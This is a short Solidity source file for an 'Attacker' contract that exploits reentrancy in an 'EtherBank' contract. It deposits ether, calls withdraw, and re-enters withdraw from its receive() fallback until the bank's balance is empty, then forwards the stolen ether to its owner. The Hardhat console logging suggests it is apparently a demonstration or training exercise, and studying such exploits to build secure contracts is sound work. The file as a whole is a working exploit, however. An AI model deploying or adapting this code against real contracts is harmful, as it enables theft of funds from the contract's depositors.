// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;


import "./IEtherBank.sol";

import "hardhat/console.sol";


contract Attacker{

	IEtherBank public immutable etherBank;
	address private owner;

	modifier onlyOner(){
		require(msg.sender==owner,"not owner");
		_;
	}

	constructor(address bankAddress){
		etherBank =IEtherBank(bankAddress);
		owner = msg.sender;
	}

	function attack() external payable onlyOner{
		etherBank.deposit{value:msg.value}();	
		etherBank.withdraw();
	}

	receive() external payable{
		console.log("receive...");
		if(address(etherBank).balance > 0){
			console.log("reenter...");
			etherBank.withdraw();
		}else{
			console.log	("victim account drained");
			payable(owner).transfer(address(this).balance);
		}
	}
}
